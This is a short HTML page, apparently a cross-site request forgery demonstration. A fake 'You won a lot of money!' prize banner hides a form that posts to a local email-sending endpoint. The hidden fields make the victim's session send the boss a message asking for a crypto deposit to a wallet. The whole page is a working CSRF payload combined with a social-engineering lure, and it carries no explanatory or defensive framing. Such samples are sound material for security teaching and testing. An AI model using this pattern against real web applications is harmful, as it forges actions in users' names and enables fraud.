<!doctype html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport"
		  content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
	<meta http-equiv="X-UA-Compatible" content="ie=edge">
	<title>You won a lot of money!</title>
</head>
<style>
	.banner {
		background-color: #ff0000;
		color: #ffffff;
		padding: 10px;
		font-size: 48px;
		text-align: center;
		width: 100%;
		height: 300px;
	}
</style>
<body>
	<div class="banner">
		<p>You've just won a lot of money. Click the button to claim the prize!</p>
		<iframe style="display:none" name="csrf"></iframe>
		<form id="myForm" action="http://localhost:8080/email/send" target="csrf" method="post">
			<input type="hidden" name="to" value="boss@example.com">
			<input type="hidden" name="subject" value="Urgent!">
			<input type="hidden" name="content" value="Can you deposit Crypto to my wallet XXX?">
			<input type="submit" value="Win Money">
		</form>
	</div>
</body>
